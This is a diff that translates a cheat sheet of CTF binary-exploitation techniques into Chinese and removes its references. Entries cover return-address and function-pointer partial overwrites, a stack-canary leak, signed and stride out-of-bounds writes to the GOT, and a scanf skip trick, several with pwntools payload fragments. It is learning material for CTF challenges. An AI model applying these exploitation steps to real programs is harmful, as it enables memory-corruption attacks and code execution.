-## Return Address LSB Overwrite + read() Chaining (TUCTF 2018)
+## 17. 单字节返回地址覆盖 + `read` 链（TUCTF 2018）
 
-**Pattern:** `read(0, buf, 0x80)` overflows into the saved return address by exactly one byte (off-by-one in the read size). Overwriting only the LSB keeps the high bytes intact, so you land a few bytes earlier in the same function. Pick a byte that points inside the function prologue before another `read()` call — it fires again with attacker-controlled args.
+**判据**：`read(0, buf, 0x80)` 的 off-by-one 恰好只覆盖返回地址一个字节。只改 LSB 保持高位不变，落回同函数的稍前位置——挑一个 `read()` 之前的字节，就能用可控参数再触发一次读。
 
 ```python
-# Offset 29 in the buffer = saved RIP LSB
-payload = b'\x15' * 29     # 0x56555d22 -> 0x56555d15 (inside read() prologue)
+payload = b'\x15' * 29        # 0x56555d22 -> 0x56555d15（read 序言内）
 p.sendline(payload)
 
-# Second read call now reads into &password with length 0x2b
-p.send(p32(0) + p32(password_addr) + p32(0x2b))
+p.send(p32(0) + p32(password_addr) + p32(0x2b))   # 第二次 read 写进 &password
 ```
 
-**Key insight:** A one-byte ret overwrite reused as a "call this function again" primitive is often stronger than a full ROP, because you bypass ASLR entirely — you jump to an instruction already at a known relative offset.
-
-**References:** TUCTF 2018 — Lisa, writeup 12339
+**关键**：一个字节的 ret 覆盖当「再调一次这个函数」的原语，常常比完整 ROP 更强——完全绕过 ASLR，跳的是同页内已知相对偏移的指令。
 
 ---
 
-## Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)
+## 18. 单字节 canary 尾部泄漏（hxp 2018）
 
-**Pattern:** glibc stack canaries always start with `0x00` so that `strcpy`/`printf("%s")` stops immediately. Send exactly `buf_size + 1` bytes; the `puts()` echo passes the canary's leading null and prints the remaining three bytes, giving you 3/4 of the canary.
+**判据**：canary 以 `0x00` 开头，`strcpy`/`printf("%s")` 会立刻停。发正好 `buf_size + 1` 字节，`puts()` 的回显越过那个 null，打出剩余 3 字节——拿到 4 字节 canary 的 3/4。
 
 ```python
 p.send(b'A' * (buf_size + 1))
 leaked = p.recvline().rstrip(b'\n')
-canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
+canary = b'\x00' + leaked[buf_size:]
 ```
 
-**Key insight:** The canary byte that makes it "safe" against string operations is also the byte that enables the leak — replace it with a non-null byte, and the echo spills everything up to the next null.
-
-**References:** hxp CTF 2018 — poor_canary, writeup 12568
+**关键**：让 canary「对字符串安全」的那个字节，同时也是让它可被泄漏的字节。
 
 ---
 
-## Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)
+## 19. 只检查索引、不检查偏移
 
-**Pattern:** Vulnerable function reads an index `v2`, checks `v2 <= 0xfc`, and writes `0xC` bytes at `array[12 * v2]`. The check covers the *index*, not the *computed byte offset*. Pick `v2` so `12 * v2` lands well past the buffer (saved RIP, canary, GOT).
+**判据**：函数读一个索引 `v2`，检查 `v2 <= 0xfc`，然后写 `array[12 * v2]` 的 12 字节。检查的是**索引**，不是**字节偏移**。
 
 ```c
-if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
+if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // 步长没乘
 ```
 
-Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array base.
+取 `v2 = 0xFB` → 写到 `12 * 0xFB = 0xBC4`，远超缓冲区。
 
-**Key insight:** Every "bounded index" check must multiply by the element stride before comparing. Look for any `array[N*idx]` or struct-indexed writes where the check is only on `idx`; the effective bound is `max_offset / stride`.
-
-**References:** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN, writeup 12041
+**审计口径**：所有 `array[N*idx]` 或结构体索引写，检查必须乘完步长再比。有效上界是 `max_offset / stride`。
 
 ---
 
-## Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)
+## 20. 有符号索引负向越界
 
-**Pattern:** `if (v5 <= 31) array[v5] = value;` compiles to a *signed* comparison. Passing `-1`, `-2`, ... passes the check and writes backward into preceding memory — typically the GOT or adjacent global structures.
+**判据**：`if (v5 <= 31) array[v5] = value;` 编译成**有符号**比较。传 `-1`、`-2` 都能过，写到前面的内存——通常是 GOT 或相邻全局结构。
 
 ```c
-int v5 = atoi(input);     // signed
-if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
+int v5 = atoi(input);                  // 有符号
+if (v5 <= 31) table[v5] = new_value;   // 写到 table[-N]
 ```
 
-Use negative indices to first leak libc (`read` GOT) and then overwrite a free GOT entry with `system`.
+用负索引先泄 libc（`read` 的 GOT），再把空闲 GOT 项改成 `system`。
 
-**Key insight:** Signed vs unsigned mismatches are everywhere. Always check the declared type; a `<= N` guard with a signed index is actually `[INT_MIN..N]`. Compile with `-Wsign-conversion` to catch this statically.
-
-**References:** P.W.N. CTF 2018 — Kindergarten PWN, writeup 12041
+**关键**：`<= N` 配上有符号索引，实际范围是 `[INT_MIN, N]`。开 `-Wsign-conversion` 能静态抓到。
 
 ---
 
-## PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)
+## 21. PIE 同页函数跳转（单字节覆盖）
 
-**Pattern:** Binary is PIE but two functions live in the same 4 KiB page: `fread_callback` at `base + 0x11BC` and `shell()` at `base + 0x11A9`. Page-relative offsets are fixed by the linker, so overwriting only the *low byte* of the stored function pointer on the stack rewrites `0xBC` → `0xA9` without needing any leak.
+**判据**：二进制是 PIE，但两个函数在同一 4 KiB 页：`fread_callback` 在 `base + 0x11BC`，`shell()` 在 `base + 0x11A9`。页内相对偏移由链接器固定，所以只覆盖栈上函数指针的**最低字节**（`0xBC` → `0xA9`）即可，完全不需要泄漏。
 
 ```python
 p.send(b'A' * overflow_to_fp + b'\xa9')
 ```
 
-**Key insight:** PIE randomises only page-aligned bits. Any two code addresses that share a page differ exclusively in the low 12 bits, so a single-byte overwrite is an ASLR-free partial overwrite whenever you can land the victim function in the same page during compilation.
-
-**References:** P.W.N. CTF 2018 — Important Service, writeup 12041
+**关键**：PIE 只随机化页对齐以上的位。同页内任意两个代码地址只差低 12 位，所以单字节覆盖就是免 ASLR 的部分覆盖——只要编译时能把目标函数排进同一页。
 
 ---
 
-## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)
+## 22. `scanf` 格式错误跳过槽位（nullcon 2019）
 
-**Pattern (babypwn):** `coin_count` is compared as signed (`(char)count > 20` rejects only positive overflow) but iterated as unsigned (`for (uint8_t i = 0; i < count; ++i)`). Sending `128` passes the check yet loops 128 times, walking past a 20-slot int array, the stack canary, saved RBP, and saved RIP. The standard "leak the canary with the same bug" trick fails because the vulnerable `printf` fires only **after** the overflow loop. Instead, feed scanf an invalid-but-format-conforming token on the two canary iterations so scanf returns error **without consuming input and without writing** — the canary stays intact while subsequent iterations continue writing past it.
+**判据**：`coin_count` 按有符号比较（`(char)count > 20` 只拦正溢出）但按无符号迭代（`for (uint8_t i = 0; i < count; ++i)`）。发 `128` 能过检查却循环 128 次，走过 20 槽数组、canary、saved RBP、saved RIP。
+
+常规「用同一个洞泄 canary」不成立——有漏洞的 `printf` 在溢出循环**之后**才触发。改成：在 canary 那两个槽位上喂 scanf 一个「格式合法但解析失败」的 token，scanf 返回错误、**不消费输入也不写内存**，canary 完好，后续迭代继续往后写。
 
 ```python
-from pwn import *
-
 target.sendline('y')
-target.sendline('2019')           # name
-target.sendline('128')            # unsigned char > 20 passes signed check
+target.sendline('2019')
+target.sendline('128')            # 无符号 char > 20，但有符号检查放过
 
-# Leak libc via GOT addresses in the first 8 coin slots (%8$s in the format string)
-target.sendline(str(0x600FA8))    # free@GOT lower 32 bits
-target.sendline(str(0))           # free@GOT upper 32 bits
-# ... repeat for puts / setbuf / printf ...
+target.sendline(str(0x600FA8))    # free@GOT 低 32 位（格式串里 %8$s 泄）
+target.sendline(str(0))
+# ... puts / setbuf / printf 同理
 
-for i in range(14):               # pad to reach canary slot (22 writes in)
-    target.sendline('1')
-    target.sendline('2')
+for i in range(14):               # 填到 canary 槽（第 22 次写）
+    target.sendline('1'); target.sendline('2')
 
-target.sendline('-')              # "-" matches "%d" prefix but can't be a number
-target.sendline('-')              # scanf returns error, leaves canary untouched
-target.sendline('0')              # saved libc_csu_init slot - scratch
+target.sendline('-')              # "-" 匹配 %d 前缀但不是数字
+target.sendline('-')              # scanf 报错，canary 原封不动
+target.sendline('0')              # libc_csu_init 槽，废值
 target.sendline('0')
-target.sendline(str(0x400806))    # return address -> main() for stage 2
+target.sendline(str(0x400806))    # 返回地址 → main，进第二阶段
 target.sendline(str(0))
 ```
 
-**Key insight:** `scanf("%d", ...)` treats a lone `-` as a format mismatch — it returns early without writing to the destination and, crucially, without consuming the `-` byte; the next scanf call will then fail identically. Using this skip primitive you can surgically choose which iterations of a "fixed-count" write loop actually land on the stack, letting you hop over canary/RBP slots to reach the return address. Combine with a signed/unsigned char comparison bug to get a loop count larger than the declared max.
+**关键**：`scanf("%d")` 遇到孤立 `-` 会提前返回，既不写目标也**不消费那个字节**——下一次 scanf 同样失败。用这个跳过原语，可以在「固定次数写入循环」里精确选择哪几次真的落到栈上，从而越过 canary/RBP 槽直达返回地址。再配上有符号/无符号比较的 bug 拿到超过声明上限的循环次数。
 
-**References:** nullcon HackIM 2019 — babypwn, writeup 13211
+---
+
+## 23. 纪律
+
+- **偏移算对之前不要谈手法**。`cyclic` 找偏移，反汇编验算，两者对上再继续。
+- **对齐问题会伪装成逻辑问题**：`movaps` 崩、`system` 崩、`one_gadget` 不中，先多塞一个 `ret`。
+- **callee-saved 不恢复，epilogue 先崩**。解析器/大栈帧的题必查 push 了哪些寄存器。
+- **canary 的两个弱点是同一个**：低字节是 null（可覆盖后泄漏），且 `fork` 下恒定（可逐字节爆破）。
+- **检查索引不等于检查偏移**，检查长度不等于检查内容（`n=0`）。
+- **报的是溢出点不是函数名**：栈/全局/结构体/协议字段，四类溢出的打法完全不同。
